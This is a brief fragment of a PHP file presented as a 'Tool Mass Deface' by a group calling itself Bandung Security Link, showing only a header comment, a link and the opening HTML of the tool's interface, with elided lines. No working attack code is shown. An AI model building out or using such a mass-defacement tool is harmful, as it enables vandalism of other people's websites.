<?php
// MalaikatDeath - BANDUNG SECURITY LINK-
http://xploitdev.pro/
...
echo $coba;
	...
	echo '<html>
	<head>
		<title>Created By Bandung Security Link</title>
	</head>

	<body>
			<center>
				<font face="arial"><h2>BANDUNG<font color="red">SECURITY</font>LINK<br><br>Tool Mass Deface </h2><hr></font>
						<table>
